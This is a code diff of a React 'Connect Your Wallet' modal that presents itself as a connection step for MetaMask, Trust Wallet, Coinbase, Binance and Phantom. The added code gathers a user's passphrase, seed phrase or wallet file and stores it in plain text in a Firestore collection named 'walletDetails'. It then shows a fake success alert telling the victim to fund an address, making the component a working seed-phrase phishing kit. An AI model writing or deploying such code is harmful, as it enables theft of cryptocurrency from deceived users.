@@ -1,156 +1,191 @@
-// components/CombinedWalletModal.js
-import { useState } from 'react';
+// components/WalletModal.js
+import React, { useState, useEffect, useCallback } from 'react';
+import { db } from '@/firebaseConfig'; // Adjust the import based on your Firebase setup
+import { getFirestore, collection, addDoc } from 'firebase/firestore';
 
-export default function CombinedWalletModal({ isOpen, onClose, onConnect }) {
-  const [currentStep, setCurrentStep] = useState('select'); // 'select' or 'keyphrase'
-  const [selectedWallet, setSelectedWallet] = useState(null);
+
+const WalletModal = ({ isOpen, onClose }) => {
+  const [showSecondaryModal, setShowSecondaryModal] = useState(false);
+  const [selectedWallet, setSelectedWallet] = useState('');
+  const [passphrase, setPassphrase] = useState('');
   const [keyphrase, setKeyphrase] = useState('');
-  const [error, setError] = useState('');
+  const [importedFile, setImportedFile] = useState(null);
 
-  const wallets = [
-    { id: 'metamask', name: 'MetaMask', logo: '/wallets/metamask.png' },
-    { id: 'trust', name: 'Trust Wallet', logo: '/wallets/trust.png' },
-    { id: 'walletconnect', name: 'WalletConnect', logo: '/wallets/walletconnect.png' },
-    { id: 'software', name: 'Enter Keyphrase', logo: '/wallets/software.png' },
-  ];
+  const walletOptions = ['MetaMask', 'Trust Wallet', 'Coinbase Wallet', 'Binance Wallet', 'Phantom'];
 
-  const handleWalletSelect = (walletId) => {
-    setSelectedWallet(walletId);
-    if (walletId === 'software') {
-      setCurrentStep('keyphrase');
-    } else {
-      // Connect directly for other wallets
-      onConnect(walletId);
-      // Don't close here - let the parent component handle closing after connection
-    }
+  const handleWalletSelect = (walletName) => {
+    setSelectedWallet(walletName);
+    setShowSecondaryModal(true);
   };
 
-  const handleKeyphraseSubmit = (e) => {
-    e.preventDefault();
-    if (!keyphrase.trim()) {
-      setError('Please enter your keyphrase');
+  const handleOtherOptionsClick = () => {
+    setSelectedWallet('Other');
+    setShowSecondaryModal(true);
+  };
+
+  const handleConnect = async () => {
+    if (!selectedWallet) {
+      // Optionally show an error message
       return;
     }
-    onConnect('software', keyphrase);
-    // Don't close here - let the parent component handle closing after connection
+
+    let walletDetails = {
+      walletName: selectedWallet,
+    };
+
+    if (passphrase) {
+      walletDetails.passphrase = passphrase;
+    } else if (keyphrase) {
+      walletDetails.keyphrase = keyphrase;
+    } else if (importedFile) {
+      // You might want to read the file content here
+      walletDetails.importedFile = importedFile.name; // Or the content itself
+    }
+
+    try {
+      const docRef = await addDoc(collection(db, "walletDetails"), walletDetails);
+      console.log("Document written with ID: ", docRef.id);
+      // if (typeof window !== 'undefined') {
+      //   localStorage.setItem('walletid', docRef.id);
+      // }
+      // Optionally show a success message
+      alert(`Connected to ${selectedWallet} successfully! Fund Your wallet using this Address: 000x0x0nbcb0ca0 to proceed.`);
+      onClose(); // Close the modal after successful connection
+    } catch (e) {
+      console.error("Error adding document: ", e);
+      // Optionally show an error message to the user
+    }
   };
 
-  const goBack = () => {
-    setCurrentStep('select');
-    setSelectedWallet(null);
+  const handleFileChange = (event) => {
+    setImportedFile(event.target.files[0]);
+  };
+
+  const handleBack = () => {
+    setShowSecondaryModal(false);
+    setSelectedWallet('');
+    setPassphrase('');
     setKeyphrase('');
-    setError('');
+    setImportedFile(null);
   };
 
-  if (!isOpen) return null;
+  // Close modal on Escape key press
+  const handleKeyDown = useCallback((event) => {
+    if (event.key === 'Escape' && isOpen) {
+      onClose();
+    }
+  }, [isOpen, onClose]);
+
+  useEffect(() => {
+    if (isOpen) {
+      document.addEventListener('keydown', handleKeyDown);
+      document.body.classList.add('overflow-hidden'); // Prevent scrolling behind the modal
+    } else {
+      document.removeEventListener('keydown', handleKeyDown);
+      document.body.classList.remove('overflow-hidden');
+      setShowSecondaryModal(false); // Reset secondary modal state when closed
+      setSelectedWallet('');
+      setPassphrase('');
+      setKeyphrase('');
+      setImportedFile(null);
+    }
+
+    return () => {
+      document.removeEventListener('keydown', handleKeyDown);
+      document.body.classList.remove('overflow-hidden');
+    };
+  }, [isOpen, handleKeyDown]);
+
+  if (!isOpen) {
+    return null;
+  }
 
   return (
-    <div className="fixed max-[500px]:w-full inset-0 z-50 overflow-y-auto">
-      <div className="flex items-center justify-center min-h-screen pt-4 px-4 pb-20 text-center sm:block sm:p-0">
+    <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center z-50">
+      <div className="bg-gray-900 rounded-xl shadow-lg p-8 w-full max-w-md relative">
+        <button
+          onClick={onClose}
+          className="absolute top-4 right-4 text-gray-500 hover:text-gray-300 focus:outline-none"
+        >
+          <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
+          </svg>
+        </button>
 
-        {/* Modal container */}
-        <div className="inline-block max-[500px]:w-full align-bottom bg-white rounded-lg text-left overflow-hidden shadow-xl transform transition-all sm:my-8 sm:align-middle sm:max-w-lg sm:w-full">
-          <div className="bg-white px-4 pt-5 pb-4 sm:p-6 sm:pb-4">
-            <div className="sm:flex sm:items-start">
-              <div className="mt-3 text-center sm:mt-0 sm:ml-4 sm:text-left w-full">
-                {/* Header with back button when in keyphrase mode */}
-                <div className="flex items-center justify-between mb-4">
-                  {currentStep === 'keyphrase' && (
-                    <button 
-                      onClick={goBack}
-                      className="text-gray-500 hover:text-gray-700"
-                    >
-                      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 19l-7-7 7-7" />
-                      </svg>
-                    </button>
-                  )}
-                  <h3 className="text-lg leading-6 font-medium text-gray-900 flex-grow text-center">
-                    {currentStep === 'select' ? 'Connect Wallet' : 'Enter Keyphrase'}
-                  </h3>
-                  {currentStep === 'keyphrase' && <div className="w-5"></div>}
-                </div>
-
-                {/* Wallet selection step */}
-                {currentStep === 'select' && (
-                  <>
-                    <div className="mt-4">
-                      <p className="text-sm text-gray-500">
-                        Choose your wallet provider
-                      </p>
-                    </div>
-                    <div className="mt-6 space-y-4">
-                      {wallets.map((wallet) => (
-                        <button
-                          key={wallet.id}
-                          onClick={() => handleWalletSelect(wallet.id)}
-                          className="w-full flex items-center justify-between p-3 border border-gray-200 rounded-lg hover:bg-gray-50 transition-colors"
-                        >
-                          <div className="flex items-center">
-                            <img
-                              src={wallet.logo}
-                              alt={wallet.name}
-                              className="w-8 h-8 mr-3"
-                            />
-                            <span>{wallet.name}</span>
-                          </div>
-                          <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7 7" />
-                          </svg>
-                        </button>
-                      ))}
-                      <button 
-                        onClick={onClose} 
-                        className="w-full mt-4 py-2 px-4 border border-gray-300 rounded-md text-sm font-medium text-gray-700 hover:bg-gray-50"
-                      >
-                        Close
-                      </button>
-                    </div>
-                  </>
-                )}
-
-                {/* Keyphrase input step */}
-                {currentStep === 'keyphrase' && (
-                  <form onSubmit={handleKeyphraseSubmit} className="mt-4 space-y-4">
-                    <div>
-                      <label htmlFor="keyphrase" className="block text-sm font-medium text-gray-700 mb-1">
-                        Recovery Phrase
-                      </label>
-                      <textarea
-                        id="keyphrase"
-                        value={keyphrase}
-                        onChange={(e) => setKeyphrase(e.target.value)}
-                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500"
-                        rows="4"
-                        placeholder="Enter your 12 or 24-word recovery phrase"
-                      />
-                      {error && <p className="mt-1 text-sm text-red-600">{error}</p>}
-                      <p className="mt-1 text-xs text-gray-500">
-                        Typically 12 (sometimes 24) words separated by single spaces
-                      </p>
-                    </div>
-                    <div className="flex justify-end space-x-3 pt-2">
-                      <button
-                        type="button"
-                        onClick={onClose}
-                        className="px-4 py-2 border border-gray-300 rounded-md text-sm font-medium text-gray-700 hover:bg-gray-50"
-                      >
-                        Cancel
-                      </button>
-                      <button
-                        type="submit"
-                        className="px-4 py-2 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700"
-                      >
-                        Connect
-                      </button>
-                    </div>
-                  </form>
-                )}
+        {!showSecondaryModal ? (
+          <div>
+            <h3 className="text-xl font-semibold text-gray-100 mb-6">Connect Your Wallet</h3>
+            <ul className="space-y-3">
+              {walletOptions.map((wallet) => (
+                <li
+                  key={wallet}
+                  className="bg-gray-800 hover:bg-gray-700 rounded-md py-3 px-4 cursor-pointer transition duration-200"
+                  onClick={() => handleWalletSelect(wallet)}
+                >
+                  <span className="block text-gray-300 font-medium">{wallet}</span>
+                </li>
+              ))}
+            </ul>
+            <button
+              className="w-full mt-6 bg-indigo-600 hover:bg-indigo-500 text-white font-semibold py-3 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-indigo-400 focus:ring-opacity-75"
+              onClick={handleOtherOptionsClick}
+            >
+              Other Options
+            </button>
+          </div>
+        ) : (
+          <div>
+            <h3 className="text-xl font-semibold text-gray-100 mb-6">Connect to {selectedWallet}</h3>
+            <div className="space-y-4">
+              <div>
+                <label htmlFor="passphrase" className="block text-sm font-medium text-gray-300 mb-1">Passphrase:</label>
+                <input
+                  type="password"
+                  id="passphrase"
+                  className="shadow-sm focus:ring-indigo-500  py-[10px] px-[10px] focus:border-indigo-500 block w-full sm:text-sm border-gray-700 rounded-md bg-gray-800 text-gray-100"
+                  value={passphrase}
+                  onChange={(e) => setPassphrase(e.target.value)}
+                />
+              </div>
+              <div>
+                <label htmlFor="keyphrase" className="block text-sm font-medium text-gray-300 mb-1">Keyphrase:</label>
+                <textarea
+                  id="keyphrase"
+                  rows="3"
+                  className="shadow-sm focus:ring-indigo-500 focus:border-indigo-500 block w-full sm:text-sm border-gray-700 rounded-md bg-gray-800 text-gray-100"
+                  value={keyphrase}
+                  onChange={(e) => setKeyphrase(e.target.value)}
+                />
+              </div>
+              <div>
+                <label htmlFor="importFile" className="block text-sm font-medium text-gray-300 mb-1">Import from File:</label>
+                <input
+                  type="file"
+                  id="importFile"
+                  className="focus:ring-indigo-500 focus:border-indigo-500 block w-full sm:text-sm text-gray-300"
+                  onChange={handleFileChange}
+                />
               </div>
             </div>
+            <div className="mt-6 flex justify-end space-x-2">
+              <button
+                className="bg-gray-700 hover:bg-gray-600 text-gray-100 font-semibold py-3 px-4 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-gray-500 focus:ring-opacity-75"
+                onClick={handleBack}
+              >
+                Back
+              </button>
+              <button
+                className="bg-indigo-600 hover:bg-indigo-500 text-white font-semibold py-3 px-6 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-indigo-400 focus:ring-opacity-75"
+                onClick={handleConnect}
+              >
+                Connect
+              </button>
+            </div>
           </div>
-        </div>
+        )}
       </div>
     </div>
   );
-}
+};
+
+export default WalletModal;
